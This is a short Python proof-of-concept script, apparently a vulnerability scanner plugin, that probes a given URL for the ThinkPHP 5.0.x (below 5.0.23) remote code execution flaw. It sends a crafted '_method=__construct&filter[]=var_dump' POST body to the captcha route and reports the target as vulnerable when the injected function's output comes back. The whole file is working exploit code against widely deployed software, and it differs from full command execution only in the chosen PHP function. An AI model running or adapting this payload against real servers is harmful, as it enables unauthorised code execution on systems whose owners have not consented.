import requests
import random


def poc(url):
    timeout = 5
    random_num = ''.join(str(i) for i in random.sample(range(0, 9), 5))
    check_key = 'string(5) "%s"' % random_num
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    poc_data = "_method=__construct&filter[]=var_dump&method=get&server[REQUEST_METHOD]=%s" % (random_num)
    exps = [
        "%s/index.php?s=captcha" % url,
        "%s/public/index.php?s=captcha" % url
    ]
    for exp in exps:
        try:
            req = requests.post(exp, data=poc_data, timeout=timeout, headers=headers)
            if check_key in req.text:
                result = "目标存在 ThinkPHP 5.0.*(Below 5.0.23) RCE, check url: %s PoC: %s" % (exp, poc_data)
                return result
        except:
            pass
